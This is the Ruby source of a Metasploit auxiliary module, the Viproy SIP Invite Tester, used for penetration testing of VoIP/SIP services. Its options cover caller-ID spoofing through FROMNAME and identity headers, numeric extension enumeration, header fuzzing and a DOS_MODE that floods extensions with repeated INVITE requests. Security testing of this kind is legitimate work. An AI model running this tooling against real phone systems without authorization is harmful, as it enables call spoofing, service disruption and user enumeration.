##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'digest/md5'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::SIP
  include Msf::Auxiliary::AuthBrute


  def initialize
		super(
			'Name'        => 'Viproy SIP Invite Tester',
			'Version'     => '1',
			'Description' => 'Invite Testing Module for SIP Services',
			'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
			'License'     => MSF_LICENSE
		)

		deregister_options('RHOSTS','USER_AS_PASS','THREADS','DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_ALL_PASS','USERPASS_FILE','PASS_FILE','PASSWORD','BLANK_PASSWORDS', 'BRUTEFORCE_SPEED','STOP_ON_SUCCESS' )

    register_options(
        [
            OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
            OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
            OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
            OptBool.new('DOS_MODE',   [true, 'Denial of Service Mode', false]),
            OptString.new('USERNAME',   [ true, "The login username to probe at each host", "NOUSER"]),
            OptString.new('PASSWORD',   [ true, "The login password to probe at each host", "password"]),
            OptString.new('TO',   [ true, "The destination number to probe at each host", "1000"]),
            OptString.new('FROM',   [ true, "The source number to probe at each host", "1000"]),
            OptString.new('FROMNAME',   [ false, "Custom Name for Message Spoofing", nil]),
            OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
            OptBool.new('LOGIN', [false, 'Login Before Sending Message', false]),
            Opt::RHOST,
            Opt::RPORT(5060),

        ], self.class)

    register_advanced_options(
        [
            Opt::CHOST,
            Opt::CPORT(5065),
            OptBool.new('DEBUG',   [ false, "Debug Level", false]),
            OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
            OptString.new('LOGINMETHOD', [false, 'Login Method (REGISTER | MESSAGE)', "MESSAGE"]),
            OptBool.new('TOEQFROM', [true, 'Try the to field as the from field for all users', false]),
            OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
            OptString.new('P-Asserted-Identity', [false, 'Proxy Identity Field. Sample: (IVR, 200@192.168.0.1)', nil]),
            OptString.new('Remote-Party-ID', [false, 'Remote Party Identity Field. (IVR, 200@192.168.0.1)', nil]),
            OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
            OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
            OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
            OptInt.new('DOS_COUNT',   [true, 'Count of Messages for DOS',1]),
            OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
            OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
            OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
            OptBool.new('USEREQFROM',   [ false, "FROM will be cloned from USERNAME", true]),

        ], self.class)
	end

	def run
    # Login Parameters
    login = datastore['LOGIN']
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    realm = datastore['REALM']
    dbg=datastore['DEBUG']

    # Protocol parameters
    proto = datastore['PROTO'].downcase
    vendor = datastore['VENDOR'].downcase
    macaddress = datastore['MACADDRESS']

    # Socket parameters
    listen_addr = datastore['CHOST']
    listen_port = datastore['CPORT']
    dest_addr =datastore['RHOST']
    dest_port = datastore['RPORT']

    # Dumb fuzzing for FROM, FROMNAME and TO fields
    if datastore['FROM'] =~ /FUZZ/
      from=Rex::Text.pattern_create(datastore['FROM'].split(" ")[1].to_i)
      fromname=nil
    else
      from = datastore['FROM']
      if datastore['FROMNAME'] =~ /FUZZ/
        fromname=Rex::Text.pattern_create(datastore['FROMNAME'].split(" ")[1].to_i)
      else
        fromname = datastore['FROMNAME'] || datastore['FROM']
      end
    end
    if datastore['TO'] =~ /FUZZ/
      from=Rex::Text.pattern_create(datastore['TO'].split(" ")[1].to_i)
    else
      to = datastore['TO']
    end



    # DOS mode setup
    if datastore['DOS_MODE']
      if datastore['NUMERIC_USERS']
        tos=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
      else
        print_error("User file is not defined.")
        return
        #tos=load_user_vars
      end
    else
      tos=[to]
    end

    sipsocket_start(listen_port,listen_addr,dest_port,dest_addr,proto,vendor,macaddress)
    sipsocket_connect

    tos.each do |to|
      to.to_s
      if datastore['TOEQFROM']
        from=to
        fromname=nil
      end

      datastore['DOS_COUNT'].times do
        result,rdata,rdebug,rawdata,callopts = send_invite(
            'login' 	      => login,
            'loginmethod'  	=> datastore['LOGINMETHOD'],
            'user'  	      => user,
            'password'	    => password,
            'realm' 	      => realm,
            'from'  	      => from,
            'fromname'  	  => fromname,
            'to'  		      => to,
        )

        printresults(result,rdata,rdebug,rawdata) if datastore['DEBUG'] == true and rdata != nil

        if rdata != nil and rdata['resp'] =~ /^18|^20|^48/ and rawdata.to_s =~ /#{callopts["tag"]}/
          print_good("Call: #{from} ==> #{to} is Ringing (Server Response: #{rdata['resp_msg'].split(" ")[1,5].join(" ")})")
        else
          vprint_status("Call: #{from} ==> #{to} is Failed (Server Response: #{rdata['resp_msg'].split(" ")[1,5].join(" ")})") if rdata != nil
        end
      end
    end

    sipsocket_stop
  end
end

